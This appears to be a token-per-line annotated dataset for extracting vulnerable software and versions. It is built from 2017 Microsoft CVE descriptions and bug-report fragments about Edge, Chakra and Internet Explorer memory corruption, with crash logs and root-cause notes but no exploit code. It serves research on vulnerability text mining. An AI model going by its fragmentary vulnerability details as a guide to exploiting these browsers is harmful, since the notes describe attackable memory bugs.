in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
Edge O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

chakra O O
! O O
JsUtil O O
: O O
:WeaklyReferencedKeyDictionary O O
< O O
Js O O
: O O
:DynamicType O O
, O O
Js O O
: O O
:DynamicType O O
ptr64 O O
, O O
DefaultComparer O O
< O O
Js O O
: O O
:DynamicType O O
const O O
ptr64 O O
> O O
,1 O O
> O O
: O O
:FindEntry O O
< O O
Js O O
: O O
:DynamicType O O
> O O
+0x41 O O
: O O
00007fff`e2b7c841 O O
8b0c81 O O
mov O O
ecx O O
, O O
dword O O
ptr O O
[ O O
rcx+rax O O
4 O O
] O O
ds:0000023b`4a2ea4c4 O O

Tested O O
on O O
Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
40.15063.0.0 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
EdgeHTML S-vulnerable_software pair_1
15.15063 S-vulnerable_version pair_1
( O O
Insider O O
Preview O O
) O O
. O O

Crash O O
Log O O
: O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

Failed O O
to O O
reproduce O O
on O O
Microsoft O O
Edge O O
38.14393.1066.0 O O
, O O
Microsoft O O
EdgeHTML O O
14.14393 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
M O O
icrosoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browsers O O
access O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Browser O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Internet O O
Explorer O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8747 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
M O O
icrosoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8749 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Internet O O
Explorer O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

A O O
remote O O
code O O
execution O O
vulnerability O O
exists O O
in O O
Excel O O
Services O O
, O O
Microsoft S-vulnerable_software pair_0
Excel S-vulnerable_software pair_0
2007 S-vulnerable_version pair_0
Service S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
3 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
Excel S-vulnerable_software pair_1
2010 S-vulnerable_version pair_1
Service S-vulnerable_version pair_1
Pack S-vulnerable_version pair_1
2 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
Excel S-vulnerable_software pair_2
2013 S-vulnerable_version pair_2
Service S-vulnerable_version pair_2
Pack S-vulnerable_version pair_2
1 S-vulnerable_version pair_2
, O O
Microsoft S-vulnerable_software pair_3
Excel S-vulnerable_software pair_3
2013 S-vulnerable_version pair_3
RT S-vulnerable_version pair_3
Service S-vulnerable_version pair_3
Pack S-vulnerable_version pair_3
1 S-vulnerable_version pair_3
, O O
and O O
Microsoft S-vulnerable_software pair_4
Excel S-vulnerable_software pair_4
2016 S-vulnerable_version pair_4
when O O
they O O
fail O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8630 O O
, O O
CVE-2017-8632 O O
, O O
and O O
CVE-2017-8731 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Internet O O
Explorer O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
Microsoft O O
Edge O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

So O O
it O O
ends O O
up O O
emitting O O
an O O
incorrect O O
opcode O O
Js O O
: O O
:OpCode O O
: O O
:StLocalSlot O O
. O O

This O O
is O O
a O O
feature O O
called O O
DeferParse O O
. O O

The O O
feature O O
is O O
enabled O O
in O O
Edge O O
by O O
default O O
. O O

The O O
problem O O
is O O
that O O
the O O
bytecode O O
generated O O
for O O
f O O
when O O
the O O
feature O O
is O O
enabled O O
is O O
different O O
to O O
the O O
bytecode O O
generated O O
when O O
the O O
feature O O
is O O
disabled O O
. O O

But O O
with O O
the O O
feature O O
, O O
the O O
method O O
is O O
not O O
called O O
. O O

Microsoft O O
Edge O O
Chakra O O
- O O
Deferred O O
Parsing O O
Makes O O
Wrong O O
Scopes O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
Microsoft O O
Edge O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8731 O O
, O O
CVE-2017-8751 O O
, O O
and O O
CVE-2017-11766 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
Edge O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

The O O
vulnerability O O
has O O
been O O
confirmed O O
on O O
Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
38.14393.1066.0 S-vulnerable_version pair_0
( O O
Microsoft S-vulnerable_software pair_1
Edge S-vulnerable_software pair_1
HTML O O
14.14393 O O
) O O
as O O
well O O
as O O
Microsoft O O
Edge O O
40.15063.0.0 S-vulnerable_version pair_1
( O O
Microsoft O O
EdgeHTML O O
15.15063 O O
) O O
. O O

Debug O O
log O O
1 O O
: O O
( O O
1790.17bc O O
) O O
: O O
Access O O
violation O O
- O O
code O O
c0000005 O O
( O O
first O O
chance O O
) O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

However O O
I O O
verified O O
that O O
the O O
bug O O
also O O
affects O O
the O O
latest O O
version O O
. O O

In O O
that O O
case O O
an O O
out-of-bounds O O
read O O
can O O
be O O
reliably O O
observed O O
in O O
COptionsCollectionCacheItem O O
: O O
:GetAt O O
function O O
( O O
see O O
Debug O O
Log O O
2 O O
below O O
) O O
. O O

Note O O
: O O
Debug O O
logs O O
were O O
obtained O O
on O O
an O O
older O O
version O O
of O O
Edge O O
for O O
which O O
symbols O O
were O O
available O O
. O O

Thus O O
if O O
an O O
attacker O O
requests O O
an O O
object O O
that O O
is O O
past O O
the O O
end O O
of O O
the O O
cache O O
buffer O O
( O O
note O O
: O O
the O O
offset O O
is O O
chosen O O
by O O
the O O
attacker O O
) O O
an O O
incorrect O O
object O O
may O O
be O O
returned O O
which O O
can O O
potentially O O
be O O
turned O O
into O O
a O O
remote O O
code O O
execution O O
. O O

Debug O O
log O O
2 O O
( O O
with O O
Page O O
Heap O O
on O O
for O O
MicrosoftEdgeCP.exe O O
and O O
MemGC O O
disabled O O
) O O
: O O
( O O
de8.13c8 O O
) O O
: O O
Access O O
violation O O
- O O
code O O
c0000005 O O
( O O
first O O
chance O O
) O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

edgehtml O O
! O O
COptionsCollectionCacheItem O O
: O O
:GetAt+0x51 O O
: O O
00007ffa`c96b1581 O O
488b04d0 O O
mov O O
rax O O
, O O
qword O O
ptr O O
[ O O
rax+rdx O O
8 O O
] O O
ds:000001b6`52743000 O O

Note O O
that O O
multiple O O
page O O
refreshes O O
are O O
usually O O
needed O O
to O O
get O O
the O O
crash O O
. O O

chakra O O
! O O
Js O O
: O O
:CrossSite O O
: O O
:MarshalVar+0x37 O O
: O O
00007ffa`c8dc23f7 O O
488b4808 O O
mov O O
rcx O O
, O O
qword O O
ptr O O
[ O O
rax+8 O O
] O O
ds:00000001`afccb7dc O O

Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
38.14393.1066.0 S-vulnerable_version pair_0
- O O
COptionsCollectionCacheItem O O
: O O
:GetAt O O
Out-of-Bounds O O
Read O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
Edge O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8734 O O
, O O
CVE-2017-8751 O O
, O O
and O O
CVE-2017-11766 O O
. O O

By O O
making O O
DOM O O
modifications O O
before O O
the O O
document O O
had O O
a O O
chance O O
of O O
fully O O
loading O O
, O O
followed O O
by O O
another O O
set O O
of O O
DOM O O
modifications O O
afer O O
the O O
page O O
has O O
been O O
loaded O O
, O O
it O O
is O O
possible O O
to O O
trigger O O
memory O O
corruption O O
that O O
could O O
possibly O O
lead O O
to O O
an O O
exploitable O O
condition O O
. O O

Note O O
that O O
the O O
crash O O
RIP O O
directly O O
preceeds O O
a O O
( O O
CFG-protected O O
) O O
indirect O O
call O O
, O O
which O O
demonstrates O O
the O O
exploitability O O
of O O
the O O
issue O O
. O O

If O O
Edge O O
displays O O
a O O
HTML O O
document O O
from O O
a O O
slow O O
HTTP O O
server O O
, O O
it O O
is O O
possible O O
that O O
a O O
part O O
of O O
the O O
document O O
is O O
going O O
to O O
be O O
rendered O O
before O O
the O O
server O O
has O O
finished O O
sending O O
the O O
document O O
. O O

It O O
is O O
also O O
possible O O
that O O
some O O
JavaScript O O
code O O
is O O
going O O
to O O
trigger O O
. O O

Simply O O
run O O
server.py O O
and O O
point O O
Edge O O
to O O
this O O
has O O
been O O
tested O O
on O O
Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
38.14393.1066.0 S-vulnerable_version pair_0
( O O
Microsoft O O
EdgeHTML O O
14.14393 O O
) O O
Debug O O
log O O
: O O
( O O
a68.9c0 O O
) O O
: O O
Access O O
violation O O
- O O
code O O
c0000005 O O
( O O
first O O
chance O O
) O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

A O O
debug O O
log O O
is O O
included O O
below O O
. O O

Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
38.14393.1066.0 S-vulnerable_version pair_0
- O O
Memory O O
Corruption O O
with O O
Partial O O
Page O O
Loading O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

So O O
the O O
object O O
literal O O
will O O
have O O
incorrect O O
members O O
( O O
b O O
= O O
0x1111 O O
, O O
c O O
= O O
0x2222 O O
) O O
, O O
this O O
leads O O
to O O
type O O
confusion O O
( O O
Chakra O O
will O O
think O O
c O O
is O O
a O O
setter O O
and O O
try O O
to O O
call O O
it O O
) O O
. O O

The O O
problem O O
is O O
that O O
Parser O O
: O O
:ParseTerm O O
also O O
parses O O
. O O

, O O
etc O O
. O O

using O O
ParsePostfixOperators O O
without O O
proper O O
checks O O
. O O

In O O
the O O
following O O
PoC O O
, O O
ConvertObjectToObjectPattern O O
skips O O
{ O O
b O O
= O O
0x1111 O O
... O O
} O O
.c O O
. O O

As O O
a O O
result O O
, O O
an O O
invalid O O
syntax O O
( O O
i.e. O O
, O O
{ O O
b O O
= O O
0x1111 O O
... O O
} O O
.c O O
) O O
can O O
be O O
parsed O O
and O O
ConvertObjectToObjectPattern O O
will O O
fail O O
to O O
convert O O
it O O
to O O
an O O
object O O
pattern O O
. O O

Microsoft O O
Edge O O
- O O
Chakra O O
Incorrectly O O
Parses O O
Object O O
Patterns O O

Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
Server S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
SP2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
R2 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
7 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and S-vulnerable_version pair_2
RT S-vulnerable_version pair_2
8.1 S-vulnerable_version pair_2
, O O
Windows S-vulnerable_software pair_3
Server S-vulnerable_version pair_3
2012 S-vulnerable_version pair_3
and S-vulnerable_version pair_3
R2 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
10 S-vulnerable_version pair_4
Gold S-vulnerable_version pair_4
, O O
1511 S-vulnerable_version pair_4
, O O
1607 S-vulnerable_version pair_4
, O O
1703 S-vulnerable_version pair_4
, O O
and O O
Windows S-vulnerable_software pair_5
Server S-vulnerable_version pair_5
2016 S-vulnerable_version pair_5
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Microsoft O O
Windows O O
Text O O
Services O O
Framework O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Windows O O
Shell O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
affected O O
Microsoft O O
scripting O O
engines O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11794 O O
and O O
CVE-2017-11803 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
and O O
CVE-2017-8672 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
and O O
CVE-2017-8674 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

Therefore O O
, O O
the O O
value O O
of O O
args.Info.Count O O
becomes O O
0 O O
. O O

So O O
args.Info.Count O O
must O O
always O O
be O O
1 O O
or O O
greater O O
. O O

If O O
the O O
flag O O
is O O
set O O
, O O
the O O
value O O
of O O
args.Info.Count O O
will O O
be O O
decremented O O
again O O
in O O
the O O
next O O
routine O O
( O O
ArgumentReader O O
: O O
:AdjustArguments O O
) O O
because O O
the O O
last O O
value O O
of O O
the O O
arguments O O
is O O
not O O
used O O
as O O
an O O
actual O O
argument O O
. O O

Var O O
JavascriptFunction O O
: O O
:EntryCall O O
( O O
RecyclableObject O O
function O O
, O O
CallInfo O O
callInfo O O
PROBE_STACK O O
( O O
function- O O
> O O
GetScriptContext O O
( O O
) O O
, O O
Js O O
: O O
:Constants O O
: O O
:MinStackDefault O O
) O O
; O O
RUNTIME_ARGUMENTS O O
( O O
args O O
, O O
callInfo O O
) O O
; O O
ScriptContext O O
scriptContext O O
= O O
function- O O
> O O
GetScriptContext O O
( O O
) O O
; O O
Assert O O
( O O
! O O

But O O
the O O
problem O O
is O O
that O O
the O O
method O O
decrements O O
args.Info.Count O O
by O O
one O O
without O O
considering O O
the O O
flag O O
CallFlags_ExtraArg O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
